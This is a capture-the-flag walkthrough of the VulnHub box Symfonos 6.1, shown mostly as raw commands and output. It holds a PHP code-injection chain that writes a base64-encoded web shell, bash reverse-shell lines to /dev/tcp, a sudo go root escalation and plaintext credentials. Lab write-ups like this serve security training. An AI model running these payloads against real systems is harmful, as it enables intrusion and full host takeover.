http://ratmirkarabut.com/articles/vulnhub-writeup-symfonos-6-1/
https://medium.com/@roshancp/command-execution-preg-replace-php-function-exploit-62d6f746bda4
https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace

Version:
PHP 5.6.40 
FlySpray 1.0-rc4


```console

└─$ sudo nmap -sT -A -Pn -n -T4 -p-  192.168.110.52
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-20 15:37 CEST
Nmap scan report for 192.168.110.52
Host is up (0.00048s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 0e:ad:33:fc:1a:1e:85:54:64:13:39:14:68:09:c1:70 (RSA)
|   256 54:03:9b:48:55:de:b3:2b:0a:78:90:4a:b3:1f:fa:cd (ECDSA)
|_  256 4e:0c:e6:3d:5c:08:09:f4:11:48:85:a2:e7:fb:8f:b7 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
3000/tcp open  ppp?
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=d61ecff5d0c292a3; Path=/; HttpOnly
|     Set-Cookie: _csrf=JiyKt5nFTDks8JcJCCrkTmKdm2o6MTYzMjE1MjI1MDM5MTk3MjM5OQ; Path=/; Expires=Tue, 21 Sep 2021 15:37:30 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 20 Sep 2021 15:37:30 GMT
|     <!DOCTYPE html>
|     <html lang="en-US">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title> Symfonos6</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|     console.info('ServiceWorker registration successful with scope: ', registrat
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=38dc08b091a7b107; Path=/; HttpOnly
|     Set-Cookie: _csrf=g6XYtTYGp9yAwWoTDZeieBmVR-Q6MTYzMjE1MjI1NTQxNDE2Mzg5NA; Path=/; Expires=Tue, 21 Sep 2021 15:37:35 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Mon, 20 Sep 2021 15:37:35 GMT
|     <!DOCTYPE html>
|     <html lang="en-US">
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Symfonos6</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|_    console.info('ServiceWorker registration successful
3306/tcp open  mysql   MariaDB (unauthorized)
5000/tcp open  upnp?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain
|     Date: Mon, 20 Sep 2021 15:38:00 GMT
|     Content-Length: 18
|     page not found
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain
|     Date: Mon, 20 Sep 2021 15:37:30 GMT
|     Content-Length: 18
|     page not found
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/plain
|     Date: Mon, 20 Sep 2021 15:37:45 GMT
|     Content-Length: 18
|_    page not found
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
MAC Address: 08:00:27:B9:4C:8A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.48 ms 192.168.110.52

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.19 seconds



```
└─$ nikto --url http://192.168.110.52
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.110.52
+ Target Hostname:    192.168.110.52
+ Target Port:        80
+ Start Time:         2021-09-20 15:46:38 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS) PHP/5.6.40
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ PHP/5.6.40 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 8724 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-09-20 15:47:34 (GMT2) (56 seconds)
---------------------------------------------------------------------------

```console

└─$ gobuster dir -u http://192.168.110.52/ -w /usr/share/wordlists/dirb/common.txt                                                                                                      130 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.110.52/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/21 16:46:39 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 211]
/.htaccess            (Status: 403) [Size: 211]
/.hta                 (Status: 403) [Size: 206]
/cgi-bin/             (Status: 403) [Size: 210]
/flyspray             (Status: 301) [Size: 239] [--> http://192.168.110.52/flyspray/]
/index.html           (Status: 200) [Size: 251]                                      
/posts                (Status: 301) [Size: 236] [--> http://192.168.110.52/posts/]   
                                                                                     
===============================================================
2021/09/21 16:46:40 Finished
===============================================================

```

```console

searchsploit  flyspray
searchsploit -m php/webapps/41918.txt

```

```console


I have configured gitea for our git needs internally!

Here are my creds in case anyone wants to check out our project!

achilles:h2sBr9gryBunKdF9


```


```console

curl -c cookie -H "Content-Type: application/json" "http://192.168.110.52:5000/ls2o4g/v1.0/auth/login" -d '{"username":"achilles","password":"h2sBr9gryBunKdF9"}'; echo


curl -b cookie -H "Content-Type: application/json" -X PATCH "http://192.168.110.52:5000/ls2o4g/v1.0/posts/1"  -d '{"text":"sleep(10);"}'; echo


curl  -b cookie -H "Content-Type: application/json" -X PATCH "http://192.168.110.52:5000/ls2o4g/v1.0/posts/1"  -d $'{"text":"file_put_contents(\'test\', \'right in the heel\');"}'; echo


#echo '<?php phpinfo(); ?>' | base64 -w 0
curl -b cookie -H "Content-Type: application/json" -X PATCH "http://192.168.110.52:5000/ls2o4g/v1.0/posts/1" -d $'{"text":"file_put_contents(\'info.php\', base64_decode(\'PD9waHAgcGhwaW5mbygpOyA/Pgo=\'));"}'; echo
curl -s http://192.168.110.52/posts/ > /dev/null

#echo '<?php system($GET['cmd']); ?>' | base64 -w 0
curl -b cookie -H "Content-Type: application/json" -X PATCH "http://192.168.110.52:5000/ls2o4g/v1.0/posts/1" -d $'{"text":"file_put_contents(\'shell.php\', base64_decode(\'PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==\'));"}'; echo
curl -s http://192.168.110.52/posts/ > /dev/null

curl -G "http://192.168.110.52/posts/shell.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.110.1/1234 0>&1'"

```

```console

curl -G "http://192.168.110.52/posts/shell.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.110.1/1234 0>&1'"

└─$ nc -lvp 1234
listening on [any] 1234 ...
connect to [192.168.110.1] from symfonos.local [192.168.110.52] 41968
bash-4.2$ id
uid=48(apache) gid=48(apache) groups=48(apache)

```
 
```console
└─$ nc -lvp 1234
listening on [any] 1234 ...
connect to [192.168.110.1] from symfonos.local [192.168.110.52] 41968
bash: no job control in this shell
bash-4.2$ id
id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-4.2$ su achilles
su achilles
Password: h2sBr9gryBunKdF9
id
uid=1000(achilles) gid=1000(achilles) groups=1000(achilles),48(apache)
sudo -l
User achilles may run the following commands on symfonos6:
    (ALL) NOPASSWD: /usr/local/go/bin/go
cat t.go
package main

import ("os/exec")

func main() {
    exec.Command("bash", "-c", "bash -i >& /dev/tcp/192.168.110.1/5555 0>&1").Run()
}

sudo /usr/local/go/bin/go run t.go

└─$ nc -lvp 5555                     
listening on [any] 5555 ...
connect to [192.168.110.1] from symfonos.local [192.168.110.52] 59552
bash: no job control in this shell
[root@symfonos6 achilles]# id
id
uid=0(root) gid=0(root) groups=0(root)
[root@symfonos6 achilles]# 

```

```python

cat browser.py
#!/usr/bin/python3.6

from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from time import sleep
import os
import re

chrome_options = Options()  
chrome_options.add_argument('--headless')
chrome_options.add_argument('--no-sandbox')
chrome_options.add_argument('--disable-dev-shm-usage')
driver = webdriver.Chrome(executable_path='/usr/local/bin/chromedriver', chrome_options=chrome_options)

interfaces = os.listdir('/sys/class/net/')
for i in interfaces:                                                                                                                                                                      
    if i != "lo":                                                                                                                                                                         
        interface = i                                                                                                                                                                     
        break
          
ipv4 = re.search(re.compile(r'(?<=inet )(.*)(?=\/)', re.M), os.popen('/usr/sbin/ip addr show ' + interface).read()).groups()[0]

while True:
        url = "http://{}/flyspray/".format(ipv4)
        print("URL: " + url)
        sleep(3)
        driver.get(url)
        driver.find_element_by_id("show_loginbox").click()
        driver.find_element_by_id("lbl_user_name").send_keys("achilles")
        driver.find_element_by_id("lbl_password").send_keys("aqMeqTqVzYFjD2ak")
        driver.find_element_by_id("login_button").click()
        print("Logged in: " + driver.title)
        sleep(3)
        driver.get(url + "index.php?do=details&task_id=1")
        print("Get hacked: " + driver.title)
        sleep(3)
        driver.get(url + "index.php?do=authenticate&logout=1")
        print("Logged out: " + driver.title)
        print("\nSleeping for 60 seconds...")
        sleep(60)
        
```